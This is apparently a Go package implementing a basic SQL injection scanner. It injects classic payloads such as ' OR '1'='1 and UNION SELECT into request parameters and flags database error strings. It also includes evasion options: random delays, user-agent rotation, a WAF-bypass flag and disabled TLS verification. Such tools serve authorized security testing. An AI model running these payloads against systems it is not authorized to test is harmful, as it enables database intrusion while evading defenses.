package scanner

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type ScanConfig struct {
	URL              string
	Method           string
	Params           []string
	Headers          map[string]string
	Timeout          time.Duration
	Threads          int
	Advanced         bool
	WAFBypass        bool
	RandomDelays     bool
	UserAgentRotate  bool
	VerifySSL        bool
	Proxy            string
}

type ScanResult struct {
	URL            string
	Vulnerable     bool
	Type           string
	Parameter      string
	Payload        string
	Confidence     float64
	Details        string
	ResponseTime   time.Duration
}

type Scanner struct {
	config  ScanConfig
	client  *http.Client
	results []ScanResult
	mu      sync.Mutex
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
}

func NewScanner(config ScanConfig) *Scanner {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: !config.VerifySSL,
	}

	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
		MaxIdleConns:    100,
		IdleConnTimeout: 90 * time.Second,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
	}

	return &Scanner{
		config:  config,
		client:  client,
		results: []ScanResult{},
	}
}

func (s *Scanner) Scan() error {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, s.config.Threads)

	for _, param := range s.config.Params {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			s.scanParameter(p)
		}(param)
	}

	wg.Wait()
	return nil
}

func (s *Scanner) scanParameter(param string) {
	payloads := []string{
		"' OR '1'='1",
		"' OR 1=1 --",
		"' OR 'a'='a",
		"1' UNION SELECT NULL --",
	}

	for _, payload := range payloads {
		if s.config.RandomDelays {
			delay := time.Duration(rand.Intn(1000)) * time.Millisecond
			time.Sleep(delay)
		}

		result := s.testPayload(param, payload)
		if result.Vulnerable {
			s.mu.Lock()
			s.results = append(s.results, result)
			s.mu.Unlock()
		}
	}
}

func (s *Scanner) testPayload(param, payload string) ScanResult {
	result := ScanResult{
		URL:        s.config.URL,
		Parameter:  param,
		Payload:    payload,
		Confidence: 0.0,
	}

	userAgent := s.config.Headers["User-Agent"]
	if s.config.UserAgentRotate {
		userAgent = userAgents[rand.Intn(len(userAgents))]
	}

	req, err := s.buildRequest(param, payload, userAgent)
	if err != nil {
		return result
	}

	start := time.Now()
	resp, err := s.client.Do(req)
	result.ResponseTime = time.Since(start)

	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return result
	}

	if strings.Contains(string(body), "SQL syntax") ||
		strings.Contains(string(body), "MySQL") ||
		strings.Contains(string(body), "syntax error") {
		result.Vulnerable = true
		result.Type = "Error-based SQL Injection"
		result.Confidence = 0.95
	}

	return result
}

func (s *Scanner) buildRequest(param, payload, userAgent string) (*http.Request, error) {
	var req *http.Request
	var err error

	if strings.ToUpper(s.config.Method) == "GET" {
		vals := url.Values{}
		vals.Set(param, payload)
		testURL := s.config.URL
		if strings.Contains(testURL, "?") {
			testURL += "&" + vals.Encode()
		} else {
			testURL += "?" + vals.Encode()
		}

		req, err = http.NewRequest("GET", testURL, nil)
	} else {
		data := url.Values{}
		data.Set(param, payload)
		req, err = http.NewRequest("POST", s.config.URL, strings.NewReader(data.Encode()))
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	}

	if err != nil {
		return nil, err
	}

	req.Header.Add("User-Agent", userAgent)
	for k, v := range s.config.Headers {
		req.Header.Add(k, v)
	}

	return req, nil
}

func (s *Scanner) GetResults() []ScanResult {
	return s.results
}
